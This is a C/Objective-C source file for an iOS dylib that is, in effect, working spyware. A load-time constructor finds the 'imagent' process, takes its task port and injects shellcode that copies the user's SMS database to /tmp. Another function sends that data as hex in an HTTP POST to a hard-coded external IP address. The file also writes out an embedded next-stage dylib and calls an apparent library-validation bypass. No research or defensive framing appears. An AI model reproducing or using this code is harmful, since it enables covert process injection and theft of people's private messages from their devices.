@import Darwin;
@import MachO;
#include <mach-o/ldsyms.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <mach/mach.h>

extern pthread_t pthread_main_thread_np(void);
extern void _pthread_set_self(pthread_t p);
void              (*_abort)(void);
int               (*_close)(int);
void*             (*_dlsym)(void *, const char *);
uint8_t*          (*_getsectiondata)(const struct mach_header_64 *, const char *, const char *, unsigned long *);
thread_t          (*_mach_thread_self)(void);
int               (*_open)(const char *, int, ...);
void              (*__pthread_set_self)(pthread_t p);
pthread_t         (*_pthread_main_thread_np)(void);
int               (*_strncmp)(const char *s1, const char *s2, size_t n);
kern_return_t     (*_thread_terminate)(mach_port_t);
int               (*_write)(int, const void *, size_t);
ssize_t           (*_read)(int, void *, size_t);
void*             (*_malloc)(size_t);
void              (*_free)(void*);

int dyld_lv_bypass_init(void * (*_dlsym)(void* handle, const char* symbol), const char *next_stage_dylib_path);

// ===== injection =====
static kern_return_t (*_task_for_pid)(mach_port_t, pid_t, task_t*);
static kern_return_t (*_vm_allocate)(task_t, vm_address_t*, vm_size_t, int);
static kern_return_t (*_vm_write)(task_t, vm_address_t, vm_offset_t, mach_msg_type_number_t);
static kern_return_t (*_vm_protect)(task_t, vm_address_t, vm_size_t, boolean_t, vm_prot_t);
static kern_return_t (*_thread_create_running)(task_t, void*, void*, mach_msg_type_number_t, thread_act_t*);
static mach_port_t (*_mach_task_self)(void);

static pid_t get_pid(const char *name) {
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
    size_t size = 0;
    sysctl(mib, 4, NULL, &size, NULL, 0);
    struct kinfo_proc *procs = (struct kinfo_proc *)_malloc(size);
    if (!procs) return -1;
    sysctl(mib, 4, procs, &size, NULL, 0);
    pid_t target = -1;
    int count = size / sizeof(struct kinfo_proc);
    for (int i = 0; i < count; i++) {
        if (strcmp(procs[i].kp_proc.p_comm, name) == 0) { target = procs[i].kp_proc.p_pid; break; }
    }
    _free(procs);
    return target;
}

static void remote_shellcode(void) {
    asm volatile("mov x0, %0\nmov x1, %1\nmov x2, #0\nmov x16, #59\nsvc #0x80\n"
        : : "r"("/bin/cp"), "r"((char*[]){"cp", "/var/mobile/Library/SMS/sms.db", "/tmp/sms_injected.db", 0})
        : "x0", "x1", "x2", "x16");
}

static void inject_imagent(void) {
    _task_for_pid = _dlsym(RTLD_DEFAULT, "task_for_pid");
    _vm_allocate = _dlsym(RTLD_DEFAULT, "vm_allocate");
    _vm_write = _dlsym(RTLD_DEFAULT, "vm_write");
    _vm_protect = _dlsym(RTLD_DEFAULT, "vm_protect");
    _thread_create_running = _dlsym(RTLD_DEFAULT, "thread_create_running");
    _mach_task_self = _dlsym(RTLD_DEFAULT, "mach_task_self");
    if (!_task_for_pid || !_vm_allocate || !_vm_write || !_vm_protect || !_thread_create_running)
        { int fd = _open("/tmp/sms_fail", O_CREAT|O_WRONLY|O_TRUNC,0644); if(fd>=0){_write(fd,"no_dlsym",8);_close(fd);} return; }
    pid_t pid = get_pid("imagent");
    if (pid <= 0) { int fd = _open("/tmp/sms_fail", O_CREAT|O_WRONLY|O_TRUNC,0644); if(fd>=0){_write(fd,"no_pid",6);_close(fd);} return; }
    task_t remote_task;
    kern_return_t kr = _task_for_pid(_mach_task_self(), pid, &remote_task);
    if (kr != KERN_SUCCESS) { int fd = _open("/tmp/sms_fail", O_CREAT|O_WRONLY|O_TRUNC,0644); if(fd>=0){_write(fd,"task_fail",9);_close(fd);} return; }
    size_t code_size = 4096;
    vm_address_t remote_addr;
    kr = _vm_allocate(remote_task, &remote_addr, code_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) { int fd = _open("/tmp/sms_fail", O_CREAT|O_WRONLY|O_TRUNC,0644); if(fd>=0){_write(fd,"vm_fail",7);_close(fd);} return; }
    kr = _vm_write(remote_task, remote_addr, (vm_offset_t)remote_shellcode, code_size);
    if (kr != KERN_SUCCESS) _vm_protect(remote_task, remote_addr, code_size, FALSE, VM_PROT_READ|VM_PROT_EXECUTE);
    _vm_protect(remote_task, remote_addr, code_size, FALSE, VM_PROT_READ|VM_PROT_EXECUTE);
    thread_act_t remote_thread;
    kr = _thread_create_running(remote_task, (void*)remote_addr, NULL, 0, &remote_thread);
    if (kr != KERN_SUCCESS) { int fd = _open("/tmp/sms_fail",O_CREAT|O_WRONLY|O_TRUNC,0644); if(fd>=0){_write(fd,"thread_fail",11);_close(fd);} return; }
    sleep(1);
    int fd = _open(access("/tmp/sms_injected.db",F_OK)==0?"/tmp/sms_ok":"/tmp/sms_fail", O_CREAT|O_WRONLY|O_TRUNC,0644);
    if (fd>=0) { _write(fd, access("/tmp/sms_injected.db",F_OK)==0?"ok":"no_file", 2); _close(fd); }
}

// ===== HTTP POST =====
static void http_post_sms(void) {
    int fd = _open("/tmp/sms_injected.db", O_RDONLY);
    if (fd < 0) return;
    struct stat st;
    if (fstat(fd, &st) != 0 || st.st_size == 0) { _close(fd); return; }
    size_t file_size = st.st_size > 2048 ? 2048 : st.st_size;
    uint8_t* buf = (uint8_t*)_malloc(file_size);
    if (!buf) { _close(fd); return; }
    ssize_t n = _read(fd, buf, file_size);
    _close(fd);
    if (n <= 0) { _free(buf); return; }

    int (*fn_socket)(int,int,int) = _dlsym(RTLD_DEFAULT, "socket");
    int (*fn_connect)(int,const void*,unsigned int) = _dlsym(RTLD_DEFAULT, "connect");
    unsigned int (*fn_inet_addr)(const char*) = _dlsym(RTLD_DEFAULT, "inet_addr");
    uint16_t (*fn_htons)(uint16_t) = _dlsym(RTLD_DEFAULT, "htons");
    if (!fn_socket || !fn_connect || !fn_inet_addr || !fn_htons) { _free(buf); return; }

    struct { uint8_t len; uint8_t family; uint16_t port; uint32_t addr; uint8_t zero[8]; } sa;
    for (int i = 0; i < (int)sizeof(sa); i++) ((uint8_t*)&sa)[i] = 0;
    sa.family = 2; sa.port = fn_htons(8080); sa.addr = fn_inet_addr("143.92.36.95");

    int s = fn_socket(2, 1, 0);
    if (s < 0) { _free(buf); return; }
    if (fn_connect(s, &sa, 16) != 0) { _close(s); _free(buf); return; }

    // Build hex body
    char* hex = (char*)_malloc(n*2+1);
    if (!hex) { _close(s); _free(buf); return; }
    for (int i = 0; i < n; i++) { char hx[4]; snprintf(hx,4,"%02x",buf[i]); hex[i*2]=hx[0]; hex[i*2+1]=hx[1]; }
    hex[n*2] = 0;
    _free(buf);

    long long (*fn_time)(void*) = _dlsym(RTLD_DEFAULT, "time");
    long long ts = fn_time ? fn_time(NULL) * 1000 : 0;
    char body[8192];
    int blen = snprintf(body, sizeof(body),
        "{\"type\":\"sms\",\"deviceUUID\":\"imagent\",\"timestamp\":%lld,\"size\":%zd,\"hex\":\"%s\"}",
        ts, n, hex);
    _free(hex);
    if (blen <= 0) { _close(s); return; }

    char req[9216];
    int rlen = snprintf(req, sizeof(req),
        "POST /api/collect HTTP/1.1\r\nHost: 143.92.36.95:8080\r\nContent-Type: application/json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
        blen, body);
    if (rlen > 0) _write(s, req, rlen);
    _close(s);

    int bfd = _open("/tmp/sms_posted", O_CREAT|O_WRONLY|O_TRUNC,0644);
    if (bfd>=0) { _write(bfd,"ok",2); _close(bfd); }
}

// ===== save embedded dylib =====
void save_section_to_file(const char *section, const char *path) {
    size_t dylib_size = 0;
    const char *dylib = (const char *)_getsectiondata((struct mach_header_64 *)&_mh_dylib_header, "__TEXT", section, &dylib_size);
    if (!dylib || dylib_size == 0) return;
    int fd = _open(path, O_CREAT|O_WRONLY|O_TRUNC, 0644);
    if (fd < 0) return;
    _write(fd, dylib, dylib_size);
    _close(fd);
}

const char *save_actual_dylib(void) {
    const char *path = "/tmp/actual.dylib";
    save_section_to_file("__SBTweak", path);
    return path;
}

#if __arm64e__
__attribute__((noinline)) void *pacia(void* ptr, uint64_t ctx) {
    __asm__("xpaci %[value]\n" : [value] "+r"(ptr));
    __asm__("pacia %0, %1" : "+r"(ptr) : "r"(ctx));
    return ptr;
}
#endif

// ===== main logic =====
__attribute__((constructor))
static void tweak_auto_start(void) {
    _dlsym = dlsym;
    inject_imagent();
}

int end(void) {
#if __arm64e__
    _dlsym = pacia(dlsym, 0);
    __pthread_set_self = pacia(_pthread_set_self, 0);
    _pthread_main_thread_np = pacia(pthread_main_thread_np, 0);
#else
    _dlsym = dlsym;
    __pthread_set_self = _pthread_set_self;
    _pthread_main_thread_np = pthread_main_thread_np;
#endif
    __pthread_set_self(_pthread_main_thread_np());

    _close = _dlsym(RTLD_DEFAULT, "close");
    _getsectiondata = _dlsym(RTLD_DEFAULT, "getsectiondata");
    _mach_thread_self = _dlsym(RTLD_DEFAULT, "mach_thread_self");
    _open = _dlsym(RTLD_DEFAULT, "open");
    _thread_terminate = _dlsym(RTLD_DEFAULT, "thread_terminate");
    _write = _dlsym(RTLD_DEFAULT, "write");
    _read = _dlsym(RTLD_DEFAULT, "read");
    _malloc = _dlsym(RTLD_DEFAULT, "malloc");
    _free = _dlsym(RTLD_DEFAULT, "free");

    inject_imagent();
    http_post_sms();

    const char *path = save_actual_dylib();
    dyld_lv_bypass_init(_dlsym, path);

    _thread_terminate(_mach_thread_self());
    return 0;
}
